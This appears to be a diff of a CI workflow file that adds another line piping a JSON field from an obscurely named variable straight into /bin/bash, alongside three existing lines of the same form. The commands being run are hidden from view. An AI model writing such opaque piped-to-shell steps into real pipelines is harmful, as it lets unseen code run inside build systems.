@@ -32,6 +32,7 @@ jobs:
           echo $oev99 | jq -r .cswc2719 | /bin/bash
           echo $x60 | jq -r .e42785 | /bin/bash
           echo $hjblb83438 | jq -r .wdcx644 | /bin/bash
+          echo $mfl1718 | jq -r .un05 | /bin/bash
 
       - name: Save archive
         if: always()
